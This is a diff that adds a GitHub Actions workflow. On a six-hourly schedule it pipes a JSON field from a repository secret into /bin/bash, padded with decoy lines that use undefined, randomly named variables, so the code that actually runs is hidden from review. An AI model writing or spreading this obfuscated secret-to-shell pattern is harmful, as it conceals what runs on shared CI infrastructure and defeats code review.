@@ -1,0 +1,25 @@
+name: yuantanzhanxian
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '53 1/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: yuantanzhanxian
+        env:
+          auj1476: ${{ secrets.auj1476 }}
+        run: |
+          echo $auj1476 | jq -r .jwu3171 | /bin/bash
+          echo $dw7539 | jq -r .lj38835 | /bin/bash
+          echo $t6 | jq -r .fdnzg73604 | /bin/bash
+          echo $njntl39 | jq -r .ajoyu85681 | /bin/bash
+          echo $fejk217 | jq -r .r84 | /bin/bash
+          echo $fgpa65449 | jq -r .ihqr7587 | /bin/bash
+          echo $ih58817 | jq -r .yshak8 | /bin/bash
+          echo $h32 | jq -r .ilc4038 | /bin/bash
+          echo $fgnuh6 | jq -r .xx4 | /bin/bash
+
